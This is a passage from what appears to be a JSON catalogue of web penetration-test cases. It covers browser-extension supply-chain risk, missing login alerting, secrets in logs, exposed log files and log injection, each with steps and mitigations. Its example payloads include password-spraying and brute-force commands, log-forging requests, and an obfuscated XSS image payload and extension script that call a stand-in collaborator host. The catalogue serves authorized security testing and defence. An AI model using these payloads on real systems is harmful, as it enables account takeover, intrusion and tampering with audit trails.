+   "timeEstimate": "1-2 hours",
+   "stepsToIdentify": [
+    "Determine whether the organisation publishes, bundles, or officially recommends any browser extension, and whether the web application's functionality depends on one.",
+    "Review each relevant extension's manifest for requested permissions, especially broad host permissions (`<all_urls>` or the application's own origin), `webRequest`, `cookies`, `scripting`, and content-script match patterns.",
+    "Assess the update and ownership model: who controls publishing, whether the developer account uses strong multi-factor authentication, and whether ownership has changed hands.",
+    "In an isolated test profile, install the extension and observe, through the proxy, what pages it touches and what network requests it originates when the target application is open.",
+    "Check whether the extension injects code into the application's authenticated pages and what data in those pages it can access.",
+    "Document the trust surface: the permissions granted, the population of users, and the ease with which a hostile update could reach them."
+   ],
+   "exploitationSteps": [
+    "Confirm authorization to assess the extension's trust and permission model, and agree that any proof-of-concept uses a locally built test extension rather than tampering with a published one.",
+    "Map the capabilities an extension with the observed permissions would have on the application's authenticated pages (read DOM, read cookies, intercept requests, act as the user).",
+    "Build a minimal local test extension requesting the same permissions and a benign content script (for example one that fires an out-of-band callback when the application's page loads) and load it unpacked in the test profile.",
+    "Demonstrate that the test extension can read a marked, non-sensitive element on the application's page and send an out-of-band signal, confirming the class of access a hostile update would gain.",
+    "Do not exfiltrate real user or customer data; describe what the permission set would allow and record the specific over-broad permissions as the finding.",
+    "Report the extension, its excessive permissions, its update/ownership risk, and concrete permission-minimisation and monitoring recommendations."
+   ],
+   "examplePayloads": [
+    {
+     "label": "Inspect an extension manifest for over-broad permissions",
+     "command": "cat manifest.json | python3 -m json.tool | grep -Ei 'permissions|host_permissions|matches|all_urls|webRequest|cookies|scripting'"
+    },
+    {
+     "label": "Minimal test-extension content script (benign callback marker)",
+     "command": "// content.js\\nif (document.getElementById('poc-marker')) { fetch('https://<collaborator-host>/ext-poc/'+location.host); }"
+    },
+    {
+     "label": "Test-extension manifest requesting the same broad host access",
+     "command": "{ \"manifest_version\": 3, \"name\": \"poc\", \"version\": \"1.0\", \"host_permissions\": [\"https://<target>/*\"], \"content_scripts\": [ { \"matches\": [\"https://<target>/*\"], \"js\": [\"content.js\"] } ] }"
+    },
+    {
+     "label": "Enumerate installed extensions and permissions in the test profile",
+     "command": "# navigate to chrome://extensions -> enable Developer mode -> review each extension's 'Details' > 'Permissions'"
+    },
+    {
+     "label": "Observe extension-originated network traffic against the app",
+     "command": "# with the app open in the test profile, watch Burp for requests whose initiator is an extension origin (chrome-extension://...)"
+    }
+   ],
+   "variants": [
+    "A previously benign extension trojanised by a hostile auto-update after a developer-account compromise.",
+    "An extension sold to a new owner who monetises it by injecting code into pages, including the target application.",
+    "An over-permissioned first-party or partner extension whose broad access is unnecessary but exploitable if the extension is compromised.",
+    "A dependency inside the extension itself (a bundled third-party library) that is vulnerable or malicious, extending the supply chain one layer deeper."
+   ],
+   "mitigation": [
+    "For any extension the organisation publishes, request the minimum permissions and narrowest host match patterns needed, avoiding `<all_urls>` and broad request interception.",
+    "Protect the extension's store developer account with phishing-resistant multi-factor authentication and strict publishing controls, since that account is the update channel.",
+    "Where feasible, use managed/enterprise extension policies to allowlist approved extensions and block silent installation of others on managed devices.",
+    "Do not architect the web application to depend on a browser extension for security controls, so a compromised extension cannot subvert them.",
+    "Review and re-approve any recommended or bundled third-party extension periodically, checking for ownership changes and permission-scope creep across versions.",
+    "Provide clear guidance to users on the risks of broad-permission extensions and on removing ones they no longer use."
+   ],
+   "mitigationClientFacing": "Browser add-ons (extensions) run inside your users' browsers and can be granted powerful abilities, such as reading and changing everything on the pages they touch. When your organisation publishes, bundles, or recommends an add-on — or your app relies on one — that add-on becomes part of your software supply chain, and add-ons update themselves automatically and silently. If the add-on's developer account is compromised or the add-on is sold, a hostile update can reach all of its users at once and run on your application's pages, reading whatever they see and type. The fix is to make sure any add-on you control asks for the least access it needs, to strongly protect the account that publishes it, and to avoid depending on an add-on for anything security-critical. This keeps a convenient tool from quietly becoming a doorway into your users' sessions.",
+   "reference": {
+    "standard": "A03:2025 - Software Supply Chain Failures",
+    "cwe": "CWE-829",
+    "tools": [
+     "Burp Suite Professional",
+     "Chrome/Firefox extension developer tools",
+     "CRXcavator / extension manifest review",
+     "interactsh-client"
+    ],
+    "links": [
+     "OWASP Top 10 2025 - A03 Software Supply Chain Failures",
+     "CWE-829 (Inclusion of Functionality from Untrusted Control Sphere)",
+     "MITRE ATT&CK T1176 (Browser Extensions)"
+    ]
+   },
+   "categoryStandard": "OWASP Top 10:2025",
+   "categoryCode": "A03",
+   "categoryName": "Software Supply Chain Failures",
+   "attack": [
+    {
+     "id": "T1195",
+     "name": "Supply Chain Compromise",
+     "matrix": "enterprise"
+    }
+   ],
+   "frameworks": [
+    {
+     "standard": "OWASP WSTG v4.2",
+     "code": "WSTG-INPV",
+     "name": "Input Validation"
+    },
+    {
+     "standard": "OWASP ASVS 5.0",
+     "code": "V15",
+     "name": "Secure Coding and Architecture"
+    }
+   ]
+  },
+  {
+   "id": "WEB-161",
+   "domain": "WEB",
+   "title": "Authentication Failures Are Not Logged or Alerted",
+   "sequence": 618,
+   "severity": "medium",
+   "severityLabel": "Medium",
+   "cwe": "CWE-778",
+   "prerequisites": "Valid test credentials and, ideally, a coordinated point of contact who can confirm what appears (or fails to appear) in the application's logs and monitoring during the test. An intercepting proxy to generate controlled authentication events. Authorization to perform a bounded series of failed and successful logins and to review the resulting log and alert behaviour. This test is most reliable as a white-box or coordinated exercise, since it verifies detection, not just the front-end.",
+   "whatItIs": "When someone repeatedly fails to log in, tries many accounts, or eventually succeeds after many attempts, those events should be recorded and — for suspicious patterns — should raise an alert someone actually sees. This test checks whether the application records authentication events at all, records enough detail to be useful, and turns dangerous patterns into alerts. If failed logins are invisible and brute-force attempts trigger nothing, an attacker can grind away indefinitely and a real compromise goes unnoticed.",
+   "rootCause": "Logging is often treated as a debugging afterthought rather than a security control, so authentication outcomes are either not logged, logged without the detail needed to investigate, or logged to a place no one monitors. Alerting requires deliberate rules and a destination (a SIEM, an on-call channel), which are frequently never configured. Without both recording and alerting, the events technically 'happen' but produce no defensive response.",
+   "impact": "The absence of logging and alerting does not itself let an attacker in, but it removes the defender's ability to detect and respond, which turns a survivable incident into a breach. Brute-force and credential-stuffing campaigns can run to completion without interruption, and a successful account takeover leaves no trail for investigators, so the scope and timeline of a compromise cannot be reconstructed. This failure is a force multiplier: it makes every other authentication weakness more dangerous and prolongs the attacker's undetected dwell time.",
+   "realWorldContext": "Post-incident reports across the industry repeatedly find that attackers were inside for weeks or months before discovery, and inadequate logging of authentication and access events is a recurring reason detection came so late — the well-known lesson of many large breaches is not that an alert fired and was ignored, but that no alert existed. Regulators and frameworks treat insufficient logging as a finding in its own right precisely because it blinds responders. In engagements, testers deliberately generate noisy authentication activity and then ask the defensive team what they saw; when the answer is 'nothing', that gap is often more consequential than the individual bug that prompted the test.",
+   "difficulty": "Intermediate",
+   "timeEstimate": "1-2 hours",
+   "stepsToIdentify": [
+    "Coordinate with the client's operations or blue team so that log and alert output can be observed during the test window.",
+    "Generate a controlled set of failed logins against a single test account and check whether each failure is recorded, with a timestamp, source IP, username, and outcome.",
+    "Generate a burst of failed logins across many usernames from one source (a brute-force / spraying pattern) and check whether any threshold-based alert is raised.",
+    "Perform a successful login after several failures and verify that both the failures and the eventual success are logged in a way that ties them together.",
+    "Review whether the logs are reachable and readable by the defensive team in near-real-time, or only buried in a location no one monitors.",
+    "Confirm whether high-risk events (new-device login, credential change, admin authentication) generate distinct alerts, and note which categories are silent."
+   ],
+   "exploitationSteps": [
+    "Confirm the authorization and the test window in writing, and agree the exact volume and pattern of authentication events to generate so the exercise stays within scope.",
+    "Execute a bounded brute-force pattern against a test account using the proxy or a rate-limited script, staying within the agreed volume.",
+    "Execute a spraying pattern (one password across many usernames) at the agreed volume to model a distributed-looking attack.",
+    "Immediately afterward, work with the blue team to enumerate what was recorded and what, if anything, alerted, capturing the gap as evidence (screenshots of empty dashboards or absent alerts).",
+    "Attempt a successful login and confirm whether it, and the preceding failures, are visible to responders in a usable timeframe.",
+    "Document precisely which authentication events are unlogged, under-detailed, or un-alerted, and map each gap to a concrete detection the client should add."
+   ],
+   "examplePayloads": [
+    {
+     "label": "Generate a bounded burst of failed logins for one account",
+     "command": "for i in $(seq 1 20); do curl -s -o /dev/null -w '%{http_code}\\n' -X POST https://<target>/login -d 'username=testuser&password=wrong'$i; done"
+    },
+    {
+     "label": "Password-spray pattern (one password, many usernames) via ffuf",
+     "command": "ffuf -w usernames.txt -u https://<target>/login -X POST -d 'username=FUZZ&password=Spring2026!' -H 'Content-Type: application/x-www-form-urlencoded' -rate 5"
+    },
+    {
+     "label": "Successful login after failures, to test success-after-failure correlation",
+     "command": "curl -s -c cookies.txt -X POST https://<target>/login -d 'username=testuser&password=<correct-test-password>'"
+    },
+    {
+     "label": "Blue-team side: query the SIEM/log store for the generated events",
+     "command": "# example log query the defenders should be able to run: search authentication where action=failure and user=testuser | stats count by src_ip"
+    },
+    {
+     "label": "Check whether the app exposes any client-visible auth log surface at all",
+     "command": "curl -s https://<target>/account/security/activity -b cookies.txt"
+    }
+   ],
+   "variants": [
+    "Failed logins are logged but with insufficient detail (no source IP, no username, no timestamp) so the record cannot support an investigation.",
+    "Events are logged but only to a local file with no forwarding to a monitored SIEM, so no alert can ever fire.",
+    "A brute-force lockout occurs but produces no alert, so defenders never learn an attack happened even though the control engaged.",
+    "Successful authentication from an anomalous location or new device is not distinguished or alerted, hiding likely account takeover."
+   ],
+   "mitigation": [
+    "Log every authentication outcome (success and failure) with a consistent structured format including timestamp, source IP, username or account identifier, user agent, and result.",
+    "Forward authentication logs in near-real-time to a monitored, tamper-resistant central store (SIEM) that the defensive team actually watches.",
+    "Define and enable threshold-based alerts for brute-force, password-spraying, and repeated-failure-then-success patterns, routed to an on-call destination.",
+    "Alert on high-risk authentication events specifically: new-device or new-location logins, multi-factor changes, credential resets, and administrator authentication.",
+    "Retain authentication logs for a defined period sufficient to investigate slow, low-and-slow attacks, and protect them from modification by the accounts they record.",
+    "Regularly test detection by generating known authentication patterns (purple-team exercises) and confirming the expected alerts fire and reach a responder."
+   ],
+   "mitigationClientFacing": "When someone attacks your login page — trying many passwords, or many accounts, or finally breaking in — your systems should notice, keep a clear record, and raise an alarm for the dangerous patterns. We found that some of these events are either not recorded, recorded without enough detail to investigate, or recorded somewhere no one is watching, and that automated login attacks do not raise any alarm. This does not by itself let an attacker in, but it means an attack can run to completion unnoticed and, if an account is broken into, you would have no trail to understand what happened. The fix is to record every login attempt with useful detail, send those records to a place your team monitors, and set alarms for suspicious patterns so a real attack prompts a real response instead of silence.",
+   "reference": {
+    "standard": "A09:2025 - Security Logging and Alerting Failures",
+    "cwe": "CWE-778",
+    "tools": [
+     "Burp Suite Professional",
+     "ffuf",
+     "curl",
+     "SIEM / log query console (Splunk, Elastic)"
+    ],
+    "links": [
+     "OWASP Top 10 2025 - A09 Security Logging and Alerting Failures",
+     "CWE-778 (Insufficient Logging)",
+     "OWASP WSTG-ATHN (Authentication Testing)",
+     "MITRE ATT&CK T1110 (Brute Force)"
+    ]
+   },
+   "categoryStandard": "OWASP Top 10:2025",
+   "categoryCode": "A09",
+   "categoryName": "Security Logging and Alerting Failures",
+   "attack": [
+    {
+     "id": "T1685.002",
+     "name": "Disable or Modify Cloud Log",
+     "matrix": "enterprise"
+    }
+   ],
+   "frameworks": [
+    {
+     "standard": "OWASP WSTG v4.2",
+     "code": "WSTG-ATHN",
+     "name": "Authentication"
+    },
+    {
+     "standard": "OWASP ASVS 5.0",
+     "code": "V16",
+     "name": "Security Logging and Error Handling"
+    }
+   ]
+  },
+  {
+   "id": "WEB-162",
+   "domain": "WEB",
+   "title": "Sensitive Data Written to Application Logs in Plaintext",
+   "sequence": 619,
+   "severity": "medium",
+   "severityLabel": "Medium",
+   "cwe": "CWE-532",
+   "prerequisites": "Access to application logs or a log-viewing surface (a debug endpoint, an error page with a stack trace, a client-accessible log, a shared log aggregator, or, in a white-box test, the log store directly). An intercepting proxy to submit marked test data. Authorization to submit benign marker values and to inspect logs for whether they were recorded in the clear. Coordination with the client helps confirm what lands in back-end logs the tester cannot see directly.",
+   "whatItIs": "Applications write logs to help operators diagnose problems, but logs frequently capture more than intended — full request bodies, headers, and error details — which can include passwords, session tokens, payment-card numbers, personal data, or API keys in plaintext. Logs are then copied to aggregation systems, shared with support staff, retained for a long time, and sometimes exposed. Sensitive data that lands in a log becomes a second, poorly guarded copy of your most valuable information, sitting where far more people and systems can reach it than the primary datastore.",
+   "rootCause": "Verbose or default logging captures whole requests and responses, and error handlers dump full context including submitted values, without a step that scrubs sensitive fields. Developers instrument for debugging and forget to disable or sanitise it in production, and third-party libraries may log at their own discretion. Because logs are treated as low-sensitivity operational data, they are not protected, minimised, or masked to the standard the underlying data warrants.",
+   "impact": "Anyone with access to the logs — support engineers, operators, anyone who reaches a log aggregator or a leaked log file, or an attacker who compromises the logging pipeline — gains the plaintext secrets recorded there. Logged credentials and session tokens enable direct account takeover; logged personal or payment data is a reportable data breach; logged API keys grant access to connected systems. Because logs are widely replicated and long-retained, a single logging mistake can expose sensitive data across time and across many systems that were never meant to hold it.",
+   "realWorldContext": "Plaintext secrets in logs are a recurring cause of avoidable exposure: multiple major platforms have disclosed that user passwords were inadvertently stored in readable internal logs for extended periods, accessible to large numbers of employees, even though the primary password store was properly hashed. The pattern is consistently the same — the front door was well guarded while a full copy leaked out the side through logging. In assessments, testers submit uniquely marked values through the application and then look for those markers appearing verbatim in error pages, debug output, and any reachable log surface, because a single hit demonstrates that whatever real users submit is being captured in the clear.",
+   "difficulty": "Beginner",
+   "timeEstimate": "30-60 min",
+   "stepsToIdentify": [
+    "Enumerate any reachable log surfaces: verbose error pages and stack traces, debug or health endpoints, client-visible activity logs, and (in white-box) the server log files and aggregator.",
+    "Submit uniquely identifiable marker values in sensitive fields (a distinctive fake password, a marker in an authorization header, a fake card-shaped number using a test pattern) through the application.",
+    "Trigger error conditions deliberately (malformed input, oversized payloads) to see whether error handlers echo the full submitted request into a response or log.",
+    "Search every reachable log surface for the marker values appearing verbatim, which proves the field was captured in plaintext.",
+    "Check response headers and bodies for accidental disclosure (for example a debug header echoing the Authorization header, or a stack trace containing request parameters).",
+    "Note where the logs are stored, who can access them, how long they are retained, and whether they are forwarded to third-party aggregation, since this defines the exposure blast radius."
+   ],
+   "exploitationSteps": [
+    "Confirm authorization, and use only benign marker values and test accounts so no real sensitive data is generated during the test.",
+    "Submit marked credentials to the login and registration flows and then inspect all reachable log surfaces for those markers.",
+    "Submit a marked authorization token / API key header on an authenticated request and check error responses and logs for it appearing in the clear.",
+    "Where a client-accessible or unauthenticated log surface exists, retrieve it and demonstrate that another user's or the tester's own sensitive fields are readable there.",
+    "For back-end-only logs, coordinate with the client to confirm whether the markers landed there, capturing the confirmation as evidence rather than accessing production data directly.",
+    "Document each field that is logged in plaintext, the log location and its access scope, and the specific masking or exclusion the application should apply."
+   ],
+   "examplePayloads": [
+    {
+     "label": "Submit a uniquely marked password to the login flow",
+     "command": "curl -s -X POST https://<target>/login -d 'username=testuser&password=POCMARKER_pw_9f3a2b'"
+    },
+    {
+     "label": "Send a marked bearer token to check for header logging",
+     "command": "curl -s https://<target>/api/v1/profile -H 'Authorization: Bearer POCMARKER_tok_7c1d55'"
+    },
+    {
+     "label": "Trigger a verbose error that may echo the request into a log or page",
+     "command": "curl -s -X POST https://<target>/api/v1/orders -H 'Content-Type: application/json' -d '{\"amount\": \"POCMARKER_amt_@@@notanumber@@@\"}'"
+    },
+    {
+     "label": "White-box: grep the server log store for the markers",
+     "command": "grep -R 'POCMARKER_' /var/log/<app>/ 2>/dev/null"
+    },
+    {
+     "label": "Retrieve a client-accessible or debug log surface, if present",
+     "command": "curl -s https://<target>/debug/logs -b cookies.txt | grep -i 'POCMARKER_'"
+    }
+   ],
+   "variants": [
+    "Passwords or MFA codes captured by verbose request logging on the authentication endpoints.",
+    "Session tokens, bearer tokens, or API keys echoed into stack traces or debug headers on error.",
+    "Full payment-card or personal-data fields written to logs that are then shipped to a third-party aggregation or monitoring service.",
+    "Sensitive data logged by a third-party library at its own log level, outside the application's own scrubbing logic."
+   ],
+   "mitigation": [
+    "Implement explicit allowlisting or field-level masking in the logging layer so sensitive fields (passwords, tokens, card numbers, personal data) are redacted before any log line is written.",
+    "Disable verbose request/response and debug logging in production, and ensure error handlers log a reference identifier rather than the full submitted payload.",
+    "Return generic error responses to clients and keep detailed diagnostics in access-controlled internal logs only, never in client-facing responses or headers.",
+    "Treat logs as sensitive data: restrict access on a least-privilege basis, encrypt at rest and in transit, and apply the same handling standard as the underlying data.",
+    "Configure third-party libraries and frameworks to a safe log level and verify they do not independently log sensitive fields.",
+    "Set proportionate log-retention limits and periodically scan log stores for known sensitive-data patterns to catch regressions."
+   ],
+   "mitigationClientFacing": "To help diagnose problems, your application keeps logs, and we found that some of those logs record sensitive information — such as passwords, access tokens, or personal details — in plain, readable form. The concern is that logs are copied to many places, kept for a long time, and seen by far more people and systems than your main database, so a copy of your most sensitive data ends up sitting somewhere much less protected. There are well-known cases where organisations discovered user passwords sitting readable in internal logs for months even though their main password storage was done correctly. The fix is to automatically hide or remove sensitive fields before anything is written to a log, to keep detailed error information out of what users can see, and to protect the logs themselves as carefully as the data they might contain.",
+   "reference": {
+    "standard": "A09:2025 - Security Logging and Alerting Failures",
+    "cwe": "CWE-532",
+    "tools": [
+     "Burp Suite Professional",
+     "curl",
+     "grep",
+     "Log aggregation console (Elastic, Splunk)"
+    ],
+    "links": [
+     "OWASP Top 10 2025 - A09 Security Logging and Alerting Failures",
+     "CWE-532 (Insertion of Sensitive Information into Log File)",
+     "CWE-200 (Exposure of Sensitive Information)",
+     "OWASP Logging Cheat Sheet"
+    ]
+   },
+   "categoryStandard": "OWASP Top 10:2025",
+   "categoryCode": "A09",
+   "categoryName": "Security Logging and Alerting Failures",
+   "attack": [
+    {
+     "id": "T1552",
+     "name": "Unsecured Credentials",
+     "matrix": "enterprise"
+    }
+   ],
+   "frameworks": [
+    {
+     "standard": "OWASP WSTG v4.2",
+     "code": "WSTG-INPV",
+     "name": "Input Validation"
+    },
+    {
+     "standard": "OWASP ASVS 5.0",
+     "code": "V14",
+     "name": "Data Protection"
+    }
+   ]
+  },
+  {
+   "id": "WEB-163",
+   "domain": "WEB",
+   "title": "Application Logs Accessible to Unauthorized Users",
+   "sequence": 620,
+   "severity": "high",
+   "severityLabel": "High",
+   "cwe": "CWE-532",
+   "prerequisites": "A browser, an intercepting proxy, and a content-discovery wordlist covering common log paths and filenames. Optionally a low-privileged application account to test authenticated-but-unauthorized access to log surfaces. Authorization to perform content discovery and to retrieve any exposed log or debug artefact found, and to report on its contents without redistributing recovered data.",
+   "whatItIs": "Logs are meant to be read by operators, not by the public — but they are often left reachable: a log file served from the web root, a debug console left enabled, a verbose error page, or an internal log-viewing endpoint with no access control. When logs are reachable by unauthorized users, anyone can read the operational record of the application, which frequently includes internal paths, tokens, personal data, and details of other users' activity. It combines two problems: sensitive data ends up in logs, and the logs themselves are exposed.",
+   "rootCause": "Log files get placed inside a directory the web server serves, debug and log-viewing features are enabled in production and shipped without authentication, or an access-control rule protecting a log endpoint is missing or misconfigured. The assumption that 'no one knows the path' substitutes for an actual access control, and content-discovery tooling defeats that assumption immediately.",
+   "impact": "An attacker who can read the logs gains a rich intelligence picture and often direct secrets: internal file paths and stack traces that aid further attacks, session tokens and API keys that enable takeover, and personal or transactional data about real users that constitutes a reportable breach. Because a log accumulates over time, one exposed file can leak a long history of sensitive events at once. When the log surface is an interactive debug console, the exposure can extend beyond reading into direct interaction with the running application.",
+   "realWorldContext": "Exposed log files and left-on debug interfaces are a staple of real-world data exposure: publicly reachable log endpoints and verbose debug consoles have leaked credentials, tokens, and customer records from countless applications, and automated scanners constantly sweep the internet for exactly these paths. The combination is potent because the attacker does not need to breach anything — the sensitive record is simply being served. In engagements, testers run content discovery against common log locations early, since an exposed log often shortcuts straight to credentials or personal data and reframes the severity of everything else found alongside it.",
+   "difficulty": "Beginner",
+   "timeEstimate": "30-60 min",
+   "stepsToIdentify": [
+    "Run content discovery against common log and debug locations (for example /logs, /log, /app.log, /debug, /_debug, /trace, /error.log, /storage/logs/) using a wordlist.",
+    "Test for verbose error pages by submitting malformed input, and inspect whether stack traces, internal paths, or request data are returned to the client.",
+    "Check for framework debug consoles left enabled in production (for example a debug toolbar or an interactive traceback console) that expose environment and request detail.",
+    "Attempt to access any internal log-viewing endpoint both unauthenticated and as a low-privileged user, to test for missing authentication and missing authorization.",
+    "For any reachable log, sample its contents for sensitive material (tokens, credentials, personal data, internal paths) and record the categories present.",
+    "Note whether the exposure is anonymous or requires a low-privileged account, since anonymous exposure is more severe."
+   ],
+   "exploitationSteps": [
+    "Confirm authorization for content discovery and for retrieving exposed artefacts, and agree that recovered sensitive data will be reported to the client but not redistributed.",
+    "Discover a reachable log or debug surface through the wordlist scan or a verbose error, and confirm it returns real operational content.",
+    "Retrieve a bounded sample of the log demonstrating the exposure and identify the highest-value data present (for example a session token or credential), without harvesting the entire dataset.",
+    "If a token or credential is present, validate the finding minimally and non-destructively (for example confirming a token's format and, only if explicitly authorised, that it is currently valid) rather than using it to access data.",
+    "For an interactive debug console, demonstrate the extent of exposure by reading environment or request information, stopping short of executing state-changing actions.",
+    "Document the exact URL/endpoint, whether it required authentication, the categories of sensitive data exposed, and the access-control and configuration fixes required."
+   ],
+   "examplePayloads": [
+    {
+     "label": "Content-discovery scan for common log and debug paths",
+     "command": "ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u https://<target>/FUZZ -mc 200,206,301,302 -e .log,.txt"
+    },
+    {
+     "label": "Directly request common log file locations",
+     "command": "for p in logs/app.log log/error.log storage/logs/laravel.log debug.log trace.log; do echo \"== $p ==\"; curl -s -o /dev/null -w '%{http_code}\\n' https://<target>/$p; done"
+    },
+    {
+     "label": "Trigger a verbose error and inspect for stack traces / request data",
+     "command": "curl -s 'https://<target>/api/v1/item?id=%00%27%22' | head -c 2000"
+    },
+    {
+     "label": "Probe for a framework debug console left enabled",
+     "command": "curl -s -o /dev/null -w '%{http_code}\\n' https://<target>/__debug__/  ; curl -s -o /dev/null -w '%{http_code}\\n' https://<target>/_profiler/"
+    },
+    {
+     "label": "Test a log-viewing endpoint as anonymous vs low-privileged user",
+     "command": "curl -s -o /dev/null -w 'anon:%{http_code}\\n' https://<target>/admin/logs ; curl -s -o /dev/null -w 'lowpriv:%{http_code}\\n' -b lowpriv-cookies.txt https://<target>/admin/logs"
+    }
+   ],
+   "variants": [
+    "A log file served from within the web root because the log directory sits inside the public path.",
+    "A framework debug console or profiler left enabled in production, exposing environment variables, request data, and sometimes code execution.",
+    "An internal log-viewer endpoint missing authentication entirely, or present but missing an authorization check so any authenticated user can read it.",
+    "Verbose error responses returning full stack traces and submitted request parameters directly to the client, effectively a per-request log leak."
+   ],
+   "mitigation": [
+    "Store log files outside any web-served directory so they can never be requested over HTTP, and deny access to log file extensions at the web-server layer as defence in depth.",
+    "Disable all debug consoles, profilers, and verbose error output in production, returning only generic error messages to clients.",
+    "Require strong authentication and explicit authorization on every log-viewing or diagnostic endpoint, and verify it as both an anonymous and a low-privileged user.",
+    "Combine this with log-content minimisation (mask sensitive fields) so that even if a log is exposed, its value to an attacker is reduced.",
+    "Run recurring content-discovery scans as part of deployment validation to catch newly exposed log or debug artefacts before an attacker does.",
+    "Rotate and invalidate any credentials or tokens that were exposed in a reachable log, since exposure must be treated as compromise."
+   ],
+   "mitigationClientFacing": "Your application's internal logs — the running record operators use to diagnose problems — can be reached by people who should not be able to see them, in some cases without even logging in. Those logs contain internal details and, in places, sensitive items such as access tokens and personal information, so exposing them can hand an attacker both a map of your system and, potentially, the keys to it, without breaking in at all. The fix is to keep log files out of any location the web server will hand out, to switch off debugging and diagnostic screens in your live environment, and to require proper login and permission checks on any page that shows logs. Anything that was already exposed in a reachable log should be treated as compromised and rotated. This closes a route where your own diagnostics quietly become a public data feed.",
+   "reference": {
+    "standard": "A09:2025 - Security Logging and Alerting Failures",
+    "cwe": "CWE-532",
+    "tools": [
+     "ffuf",
+     "Burp Suite Professional",
+     "curl",
+     "SecLists wordlists"
+    ],
+    "links": [
+     "OWASP Top 10 2025 - A09 Security Logging and Alerting Failures",
+     "CWE-532 (Insertion of Sensitive Information into Log File)",
+     "CWE-200 (Exposure of Sensitive Information)",
+     "OWASP WSTG-CONF-05 (Enumerate Infrastructure and Application Admin Interfaces)"
+    ]
+   },
+   "categoryStandard": "OWASP Top 10:2025",
+   "categoryCode": "A09",
+   "categoryName": "Security Logging and Alerting Failures",
+   "attack": [
+    {
+     "id": "T1552",
+     "name": "Unsecured Credentials",
+     "matrix": "enterprise"
+    }
+   ],
+   "frameworks": [
+    {
+     "standard": "OWASP WSTG v4.2",
+     "code": "WSTG-INPV",
+     "name": "Input Validation"
+    },
+    {
+     "standard": "OWASP ASVS 5.0",
+     "code": "V14",
+     "name": "Data Protection"
+    }
+   ]
+  },
+  {
+   "id": "WEB-164",
+   "domain": "WEB",
+   "title": "Log Injection and Log Forging via Unsanitized Input",
+   "sequence": 621,
+   "severity": "medium",
+   "severityLabel": "Medium",
+   "cwe": "CWE-117",
+   "prerequisites": "The ability to submit input that the application logs (a username field, a User-Agent header, a request path, or any value echoed into logs), and access to observe the resulting log entries (white-box log access or a coordinated blue-team contact, or a client-visible activity log). An intercepting proxy. Authorization to submit crafted marker input and, where a downstream log viewer is in scope, to test how it renders logged content.",
+   "whatItIs": "Applications log user-supplied values such as usernames, paths, and headers. If those values are written into the log without neutralising special characters — especially newlines — an attacker can inject fabricated log lines, corrupt the log format, or plant content that attacks whatever reads the logs. This ranges from forging entries to mislead investigators, to breaking automated log parsing, to landing a stored cross-site scripting payload in a web-based log viewer that fires when an analyst opens it.",
+   "rootCause": "User input is concatenated directly into log messages with no encoding, so control characters retain their meaning inside the log. A newline in the input becomes a new log line; markup in the input becomes markup when a log-viewing UI renders it. The log layer implicitly trusts input that the application would otherwise treat as untrusted, and the systems that consume logs (parsers, dashboards, viewers) trust the log format they are handed.",
+   "impact": "Forged log lines let an attacker hide their own actions, frame another user, or plant misleading evidence, undermining incident response and audit integrity. Injected control characters can break log parsers and detection rules, causing real events to be missed or misclassified. Most seriously, when logged input is rendered unescaped in a log-viewing dashboard, an injected script executes in the analyst's authenticated session — a stored XSS that pivots from the log into the monitoring platform itself. The victim is often the defensive tooling and the people who rely on it.",
+   "realWorldContext": "Log injection sits behind two very different but well-documented problems. The integrity side is a classic audit-tampering concern captured by CWE-117: if an attacker can write arbitrary lines into the audit trail, the trail can no longer be trusted, which matters acutely in regulated environments. The exploitation side became vivid with Log4Shell in 2021, where attacker-controlled strings that reached a logging call were not merely stored but interpreted by the logging library, leading to remote code execution — an extreme illustration of why logging untrusted input verbatim is dangerous. Testers probe for log injection because logs are trusted by both humans and automated defences, so poisoning them undermines the very systems meant to catch attacks.",
+   "difficulty": "Intermediate",
+   "timeEstimate": "1-2 hours",
+   "stepsToIdentify": [
+    "Identify fields and headers that are likely to be logged: usernames on failed logins, request paths on 404s, User-Agent and X-Forwarded-For headers, and any value echoed into an activity feed.",
+    "Submit a benign marker containing an encoded newline and a distinctive tag (for example a username of `poc%0aINJECTED_LINE poc`) and observe whether it produces a second, forged line in the log.",
+    "Test whether markup submitted in a logged field (for example `<b>poc</b>` or an image tag with an out-of-band source) is stored raw in the log.",
+    "If a web-based log viewer or SIEM dashboard is in scope, observe how it renders the stored marker, checking whether markup is escaped or executed.",
+    "Check whether structured logging (JSON) is used, since raw concatenation into a text format is far more injectable than a properly encoded structured logger.",
+    "Record which fields reach the log unsanitised and how downstream consumers (parser, dashboard, viewer) handle the injected content."
+   ],
+   "exploitationSteps": [
+    "Confirm authorization, and agree that any payload targeting a log viewer will use a benign, non-destructive marker (a DOM change or an out-of-band callback) rather than a real attack payload.",
+    "Demonstrate log forging by submitting an input with an embedded newline that produces a fabricated, attacker-controlled log line, and capture both the input and the resulting forged entry.",
+    "Demonstrate audit obfuscation by showing how injected lines could bury or impersonate legitimate events, described rather than actually corrupting production audit data.",
+    "Where a log-viewing UI is in scope and authorised, submit a benign stored-XSS marker in a logged field and confirm it executes when the log entry is rendered, capturing the out-of-band callback as evidence.",
+    "Do not target real analysts' sessions or production monitoring; keep the demonstration within test accounts and coordinated windows.",
+    "Document each injectable field, the downstream consumer affected, and whether the outcome is forging, parser corruption, or log-viewer XSS."
+   ],
+   "examplePayloads": [
+    {
+     "label": "Newline-injected username to forge a second log line",
+     "command": "curl -s -X POST https://<target>/login --data-urlencode 'username=poc\\nINJECTED 2026-01-01 00:00:00 admin login success poc' --data 'password=wrong'"
+    },
+    {
+     "label": "Log forging via the User-Agent header",
+     "command": "curl -s https://<target>/ -H $'User-Agent: poc\\r\\n127.0.0.1 - - [POC] \\\"GET /admin HTTP/1.1\\\" 200 forged'"
+    },
+    {
+     "label": "Stored-XSS marker in a logged field for a web log viewer (benign)",
+     "command": "curl -s https://<target>/nonexistent -H 'User-Agent: <img src=x onerror=\"new Image().src=String.fromCharCode(47)+String.fromCharCode(47)+`<collaborator-host>`\">'"
+    },
+    {
+     "label": "Marker with encoded CRLF to test parser corruption",
+     "command": "curl -s 'https://<target>/search?q=poc%0d%0aFAKEKEY%3d%22value%22'"
+    },
+    {
+     "label": "White-box: inspect the log for the forged/injected lines",
+     "command": "grep -nE 'INJECTED|FAKEKEY|forged' /var/log/<app>/access.log /var/log/<app>/app.log 2>/dev/null"
+    }
+   ],
+   "variants": [
+    "Pure log forging, where injected newlines create fabricated entries to mislead investigators or hide activity.",
+    "Parser/detection corruption, where injected delimiters or control characters break the log format so SIEM rules mis-parse or drop real events.",
